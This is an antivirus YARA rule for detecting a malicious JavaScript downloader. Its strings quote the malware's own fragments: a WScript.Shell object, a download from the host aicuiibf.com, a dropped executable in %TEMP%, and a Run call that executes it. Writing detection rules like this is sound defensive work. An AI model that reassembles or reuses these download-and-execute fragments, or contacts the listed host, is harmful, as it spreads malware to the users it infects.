rule sig_20160329_57641df0226ed5955c191dc5e27dc2cd {
  meta:
    description = "datamaliciousorder - file 20160329_57641df0226ed5955c191dc5e27dc2cd.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b664e9cd06784c2f3975937ed01b82be7371198a80684ac6bf351915189afa5a"

  strings:
    $s1  = "function Pvznuwq() {return Uykpuupnt[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"hwPH6eTP5P0.exe\";};" fullword ascii
    $s2  = "Hwiti[Hauih](\"GET\", \"http://aicuiibf.com/l30woad\", false);" fullword ascii
    $s3  = "do {WScript[Tsboqmk](Gfffxbd() * 11)} while (Hwiti[\"readystate\"] < 4 );" fullword ascii
    $s4  = "var Uykpuupnt = function Wngqz() {return WScript[Rtomotl](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Kzjvhthokl(Bpnrmutmco, Vxjemgf){return Bpnrmutmco - Vxjemgf;};" fullword ascii
    $s6  = "function Vlgqhn() {return ((Mkjiofxp == true) && (Mkjiofxp == Chzpprtyso)) ? 1 : Lgorekvolj;};" fullword ascii
    $s7  = "function Jfexylxphr(Nuikxerru){Uykpuupnt[\"Run\"](Nuikxerru, Lgorekvolj, Lgorekvolj);};" fullword ascii
    $s8  = "function Uebjfyl(){return Rtomotl;};" fullword ascii
    $s9  = " while (Yzimakgh){" fullword ascii
    $s10 = "function Gfffxbd(){return 22;};" fullword ascii
    $s11 = "function Xpmqntb(Hpalymwenm) {var Ogrre = (1, 2, 3, 4, 5, Hpalymwenm); return Ogrre;};" fullword ascii
    $s12 = "var Iqhaawujkt = false;" fullword ascii
    $s13 = "function Vjvbqrs()" fullword ascii
    $s14 = "Mkjiofxp = true; " fullword ascii
    $s15 = "var Pyxlmaficb = new this[\"Date\"]();" fullword ascii
    $s16 = "return Kzjvhthokl(Ftzkmrlu, Eksxrhi);" fullword ascii
    $s17 = "var Mkjiofxp = false;" fullword ascii
    $s18 = "var Chzpprtyso = false;" fullword ascii
    $s19 = "function Hbrbooonz(){return Fndxjrc;};" fullword ascii
    $s20 = "Chzpprtyso = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}